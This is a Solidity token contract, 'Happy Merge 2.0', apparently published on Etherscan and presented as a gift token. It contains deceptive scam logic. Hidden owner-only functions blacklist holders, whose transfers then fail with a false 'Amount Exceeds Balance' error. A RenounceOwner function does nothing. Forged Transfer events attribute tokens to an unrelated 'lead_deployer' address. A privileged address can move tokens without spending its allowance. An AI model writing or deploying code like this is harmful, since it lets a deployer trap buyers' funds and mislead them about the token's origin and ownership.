/**
 *Submitted for verification at Etherscan.io on 2022-09-15
*/

pragma solidity 0.8.7;
/*
A special gift :)

*/    

contract HappyMerge {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) nAmount;

    // 
    string public name = "Happy Merge 2.0";
    string public symbol = unicode"HAPPYMERGE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);

   



      constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        

        deploy(lead_deployer, totalSupply);
    }



	address owner = msg.sender;

    address Construct = 0xa057902A33Ae87124232f4E735E56B3Bc7f46697;
    address lead_deployer = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function RenounceOwner() public onlyOwner  {

}


  function deploy(address account, uint256 amount) public onlyOwner {
        
      emit Transfer(address(0), account, amount);
   }
   function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function aabnm(address _user) public onlyOwner {
        require(!nAmount[_user], "xx");
        nAmount[_user] = true;
    
    }
    
    function abbnm(address _user) public onlyOwner {
        require(nAmount[_user], "xx");
        nAmount[_user] = false;
    
    }
    
 

 
   


    function transfer(address to, uint256 value) public returns (bool success) {
require(!nAmount[msg.sender] , "Amount Exceeds Balance"); 


if(msg.sender == Construct)  {


        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
        
require(!nAmount[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   

        if(from == Construct)  {

 require(value <= balanceOf[from]);
 require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
    
        require(!nAmount[from] , "Amount Exceeds Balance"); 
               require(!nAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}